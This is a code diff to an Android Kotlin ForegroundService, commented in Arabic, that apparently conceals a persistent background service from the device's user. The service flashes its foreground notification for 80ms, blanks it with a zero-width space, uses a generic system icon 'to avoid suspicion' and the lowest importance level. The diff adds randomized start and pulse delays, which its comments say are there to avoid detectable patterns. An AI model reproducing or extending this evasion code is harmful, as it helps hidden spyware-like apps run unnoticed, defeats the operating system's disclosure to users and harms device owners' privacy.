@@ -23,12 +23,14 @@ import kotlin.random.Random
  * - جدولة نبضات عشوائية متغيرة (45-120 دقيقة) مع إعادة جدولة ديناميكية بعد كل نبضة.
  * - أيقونة نظامية عامة (ic_menu_info_details) لتجنب الشك.
  * - أولوية منخفضة جداً (IMPORTANCE_MIN) وتجميع مع إشعارات النظام.
+ * - تأخير عشوائي عند بدء الخدمة لتجنب الأنماط الثابتة.
  *
  * ✅ تم إصلاح الإشعار الدائم.
  * ✅ تم إضافة عشوائية متغيرة في الجدولة.
  * ✅ تم إخفاء النص باستخدام \u200B.
  * ✅ تم تقليل مدة الظهور إلى 80ms.
  * ✅ تم إزالة ScheduledExecutorService واستبدالها بـ Handler مع إعادة جدولة ديناميكية.
+ * ✅ تم إضافة تأخير عشوائي عند بدء الخدمة لتجنب الأنماط القابلة للكشف.
  */
 class ForegroundService : Service() {
 
@@ -37,6 +39,8 @@ class ForegroundService : Service() {
         const val NOTIFICATION_ID = 9991
         private const val CHANNEL_ID = "shield_ghost_channel_v6"
         private const val PULSE_DURATION_MS = 80L // ظهور خاطف جداً (أقل من 150ms)
+        private const val MIN_INTERVAL_MIN = 45L
+        private const val MAX_INTERVAL_MIN = 120L
     }
 
     private val handler = Handler(Looper.getMainLooper())
@@ -69,15 +73,17 @@ class ForegroundService : Service() {
         startForeground(NOTIFICATION_ID, buildGhostNotification("System Ready"))
         isForeground = true
 
-        // إخفاء الإشعار فوراً بعد 80 مللي ثانية (لا يظهر سوى للحظات)
+        // ✅ إخفاء الإشعار فوراً بعد 80 مللي ثانية (لا يظهر سوى للحظات)
         handler.postDelayed({
             if (isForeground) {
                 notificationManager.notify(NOTIFICATION_ID, buildGhostNotification(""))
             }
         }, PULSE_DURATION_MS)
 
-        // جدولة أول نبضة شبحية بفاصل عشوائي
-        scheduleNextGhostPulse()
+        // ✅ تأخير عشوائي قبل جدولة أول نبضة (30-60 دقيقة) لتجنب الأنماط الثابتة
+        handler.postDelayed({
+            scheduleNextGhostPulse()
+        }, Random.nextLong(30 * 60 * 1000, 60 * 60 * 1000))
 
         return START_STICKY
     }
@@ -97,7 +103,7 @@ class ForegroundService : Service() {
         }
 
         // توليد فاصل عشوائي بين 45 و 120 دقيقة (بالمللي ثانية)
-        val randomDelayMs = Random.nextLong(45 * 60 * 1000, 120 * 60 * 1000)
+        val randomDelayMs = Random.nextLong(MIN_INTERVAL_MIN * 60 * 1000, MAX_INTERVAL_MIN * 60 * 1000)
         handler.postDelayed(ghostPulseRunnable!!, randomDelayMs)
     }
 
@@ -172,7 +178,7 @@ class ForegroundService : Service() {
         hideRunnable?.let { handler.removeCallbacks(it) }
 
         // 1. إظهار الإشعار مع النص المطلوب (يظهر للحظات)
-        notificationManager.notify(NOTIFICATION_ID, buildGhostNotification("Processing $actionType..."))
+        notificationManager.notify(NOTIFICATION_ID, buildGhostNotification("$actionType"))
 
         // 2. جدولة إخفاء الإشعار (تحديث النص إلى فارغ) بعد 80ms
         hideRunnable = Runnable {
